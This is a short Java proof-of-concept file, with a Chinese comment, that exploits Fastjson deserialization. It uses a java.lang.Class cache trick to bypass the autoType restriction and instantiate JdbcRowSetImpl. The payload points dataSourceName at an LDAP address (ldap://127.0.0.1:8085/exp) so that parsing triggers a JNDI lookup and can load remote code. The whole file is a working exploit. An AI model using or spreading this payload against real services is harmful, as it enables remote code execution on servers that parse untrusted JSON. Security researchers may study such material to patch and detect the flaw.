import com.alibaba.fastjson.JSON;

/*
* 这个版本不像前几个版本。简单的修补绕过，
* 利用
* */
public class FastJson_withoutAutoTypeSupport {
    public static void main(String[] args) {
        String payload = "{\"username\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"}," +
                "\"password\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://127.0.0.1:8085/exp\",\"autoCommit\":true}}";
        JSON.parse(payload);
    }
}
